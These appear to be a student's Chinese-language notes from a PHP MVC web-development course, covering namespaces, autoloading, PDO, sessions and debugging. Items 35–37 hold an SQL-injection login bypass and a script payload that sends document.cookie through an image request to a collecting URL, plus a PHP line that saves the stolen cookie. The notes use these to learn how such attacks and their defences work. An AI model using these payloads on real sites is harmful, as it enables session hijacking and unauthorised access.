9-24.不懂，不会放过，会留下来好好琢磨下   趁他在，好好努力，以后一个人会很艰难  不是记住，是理解原理

刚开始的规则我都不知道，所以他同时实施跟着老师敲代码，不要太利益化
18节
1.文件名和类名相同
2.名字空间就是文件所在的目录  相对于项目根目录的目录
3.//引入Application类
require 'core/Application.php';//区别重复包含

//执行Application类里面的方法
\core\Application::_dispatchRoute();//多个文件放在一起，使用namespace 调用类时 用空间

总结： 封装   名字空间  包含进去注意调用时一样用名字空间   封装成类外部不能访问的protected方法 类内部可以间接访问的静态方法，创建类外部可以访问的公共方法， 测试，下面代码有错，注意阻隔

22节

dispaly_errors = on 表示PHP出错的时候，在网页上显示错误，Off:php出错误的时候，不在网页上显示错误。php家的东西，所以PHP家可以进行控制

当前的程序可以设置，php报错只针对当前的请求

php 也可以控制 他和网页的关系 有哪些？字符集 报错 显示数据
23.
 自动加载   必须符合三个条件，
 文件名和类名相同，
 类必须有名字空间  名字空间必须和文件所在的目录名相同
 名字空间就是文件所在的目录，这个目录是相对于项目目录


 2.echo '\\aaa\\bbb\\ccc\\'; 只要能正常输出字符串，把结果输出来就对了，对啊，只要保证结果一样，被 php识别就行，这就是转义，重要的掌握本质
单引号里面的名字空间需要转义


3，再有名字空间的情况下，加载一个类文件进来
     require     和  名字空间下的类

  自动加载 就是把名字空间转化为了 文件路径

  namespace app\controller\backend;  命名空间这样写，前面不带\

windowns 下面 目录可以是/ \   linux 只能是\ 
定义名字空间 app\model   new \app\model

自动加载适合遵守规则的任何PHP文件

27，核心控制器  是封装的所有控制器可以用的方法，跳转等 用来继承的

继承是要用名字空间的  extends \core\Controller

29.
加载第三方代码时，为了在实例化时自动加载上，需要定义命名空间



服务器  只要有ip  可以访问其他的，内网和外网的区别。有些可以访问，有些进行了控制不能访问

30.pdo
1，连接数据库
2. 获取自增id   


想传数据到父类构造方法中，都在同一个类里面，直接重写类即可，调用父级的类

直接把想要配置的数据以一个数组的形式放在一个文件里面，在调用时，把这个文件包含进去，直接调用数组就可以（）#######################得充分学会运用一个包含的含义，就是放在一个文件里面


继承可以继承父类的构造方法，首先访问构造方法，在对象进行实例化的时候就进行了构造方法的访问。

函数里面的变量  必须通过给类才可以  例如 静态的，那么，不用实例化，类内类外都可以访问



day3

父类中风有些方法中使用的$this调用类的属性 是为了那边进行传递变量，在此处作为一个变量进行使用的，父类中没有此属性，则必在调用他的子类中有此类的属性，$this也是为了这个进行使用的，因为可以将子类的方法拿到父类中共用。

函数里面的参数的取值既可以是字符串也可以是数组 表达式  id > 1  可选参数
$where = '2>1'; 相当于有默认值，调用时传不传参数都一样     并且where 1 就是所有的数值，对结果不影响
函数的运用  参数    


函数中静态变量的意义，是否已经存在，不用每次初始化
方法的变量 类的变量   实例化模型注意防止多次实例化

参数可以用形参传 也可以用类的属性传



3.遇到问题，先观察规律，看看



rtrim 函数 就是去掉最右边的

4.$columns = '';
 foreach($data as $column => $value) {
    		$columns = $columns . $column . ',';
    		var_dump($columns);die;
    	}
 得理解字符串之间连接的本质



 5.模型类封装完，都是用最原始的方法进行封装的。父类子类可以用共同的$this 除了针对静态方法


6.frame   四次请求  四个方法

7.针对 文件找不到的问题，直接复制在计算机上，如果能找到，说明在程序里面不被识别，可能是中文的原因
模板文件名称不能是中文

#################
8.自己遇到一个大问题  每次页面输出都会有11  特别在实例化的时候才会有的输出
首先 有多余的输出，说明肯定有输出字符 并且在这个操作之前 第一步，自己前后进行排查，出问题最接近的地方是？是在实例化的时候，那么实例化的上一步是，是实例化类，找不到，进入自动加载，可以先观察自动加载 是否有输出 这样找问题，有目标，直接，不浪费
以后都得按照这个思路来找问题 可以节省时间。

之前找问题的思路有问题。

9.很多方法是在本类封装的，但是可以用于所有类，所以直接拿到核心控制器就是可以共同继承的里面，子类都可以 直接$this 进行继承
10，在点击一个链接，页面没有跳转，而是展示在另外一个位置，target= "name"


11.当前情况是 在模型中链接数据库，没有模型是不行的。在实例化模型的时候才会用到数据库

12.实例化类时   打印的这个类包含他继承的信息  实例化时会自动调用父类或者本身的construct方法  调用成功就会给类的属性进行赋值  就会打印出来

13.$userModel = \app\model\UserModel::create();  在其他控制器一定要引入类的空间
否则 就会根据空间找到的

14.require html页面
  其实就是在同一个页面，只要是PHP的  都可以直接输出都可以运用

 15. $sql = 'SELECT * FROM `{$this->table}` where {$where}';这个是错误的，必须用双引号
 才可以解析 {$where}
 16,全局变量 $_GET $_POST  这些都是全局变量 不局限于函数的阻隔，即使一个函数内调用其他的函数，这些变量不受函数外面的变量 影响，可以直接传进去  在函数内部嗲用一个函数，那这个函数内部的变量相对于这个调用的函数就是函数外部的变量，不能直接使用，但是全局的都可使使用  这也是阻隔静态页面李阿敏使用那些变量的原因所在。


 还有执行顺序，现在函数里面处理完，返回的是结果


 12.可变变量  用在键值变化转换的时候用的。
 数据在控制器上的组装  然后把变量分配到加载的函数中就行
 数据组装成字符串 然后进行转换 用可变变量进行转化

 13，注意 在给函数传递参数时，需要给函数的参数添加默认值  否则报错没定义

 14.session的作用是保存在服务器，这个网址的所有请求都可以访问到的，要充分了解session的作用和原理


 如果客户端传的变量不存在，就会报错，和


		if($_SESSION['loginFlag'] == true) {
			//正常访问
			$this->loadHtml('index');//没有显示，就直接打印，观察问题在哪，从最近找原因
		} else if($_SESSION['loginFlag' === false]) {

		}
这个前端没有传递过来参数，就会报错，因为整个下项目没有这个参数的存在，在进行判断的时候就会找不到，进行 报错


大问题，，，，，后台解决变量是否存在的问题，直接添加上这个变量存在再继续判断  就可以防止变量 不存在未定义的情况了

//对于表单提交的数据  首先呢  要判断是否有数据提交，有数据提交 怎么处理？是否是正确的数据？ 如果是？ 如果不是？怎么办？ 没有数据提交，怎么处理？


30.对用户访问那个页面的权限控制  直接在这个之前给一个方法状态进行控制，记得中规，让一个人，只能操作一个，当时应该想到，给他个人权限，如果判断是这个人，就记录状态，其他看不到，这个功能其实就是一句话的事。

31.在访问每个方法之前 必须确保已经登录  在app的时候怎么控制，已经登录？

32.exit(0); 阻止代码往下进行。if (){}else{}  中的

33.在引入第三方类的时候，为了能访问到，必须加入名字空间，类中最防的就是变量的局部问题

第三方的类，究竟哪个变量是活的，需要处理，类的属性大部分是为了解决局部变量，让其他方法进行调用的，需要的参数究竟有哪些？
34.img标签  有自动在页面请求的时候 自动加载的功能  
图片标签可以发起http请求

35.select * from user where password= '1234556' and username = 'admin OR'2>1 ';


36.sql 注入  主要针对  写入的sql语句进行单引号闭合的这点原理进行干扰 由于单引号进行闭合  会加上分号，删除整个数据库呢  需要对传入数据发单引号进行转义 就不会造成单引号闭合了


img标签 显示在静态页面，只要每次显示一次 就会发送一次请求  window.document也能，也就是不管是哪个用户进来，如果显示这个页面，那我就能利用这个标签获取当前用户的信息


37.<script>alert(window.document.cookie)</script>  img标签结合发送嘿黑客的网址
var img = new Image();
img.src = "http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=".window.docmnet.cookie;

<script>var img = new Image(); img.src = "http://mvcself.com/index.php?p=backend&c=Test&a=hack&cookie=" + window.document.cookie;</script>


file_put_contents('./1.txt',$_GET['cookie']);/这个当前的目录指的是项目目录


44.添加一个灵活的分类标准，给一个字段，可以进行自己想要的排序



45.首先设计数据表
然后，定义控制器的名称和要操作的方法(控制器的名称和表名相同就行)
    添加 p = backend  c = Category a = add
    列表  p= backend c = Category a= getList
    修改 p = backend c= Category a= update
    删除 p= backend c = Category a = delete
45.在静态页面使用<?= 需要在php.ini 开启 short_tag_open = on 
46. protected function loadHtml($name, $data = array())
在传递变量的时候，参数 如果传了，如果有等号 ， 就是后面的是赋值，后面的是真正的变量

47.理解了  下拉框  name  和 value  一般都是foreach的

48.str_repeat(input, multiplier)  字符串重复几次  无限极分类 级别和空格

$this->limitlessLevelCategory($categorys, $level + 1, $parentId = $category['id']);   这个是错误的，

$this->limitlessLevelCategory($categorys, $level + 1, $category['id']);
这个是对的
函数已经有参数和默认值  传的时候只需要传递值既可以

55.select count(*) from category where parent_id = 1;  结果是2
  select count(*)>0 from category where parent_id = 1 ; 结果是布尔值 0或者1
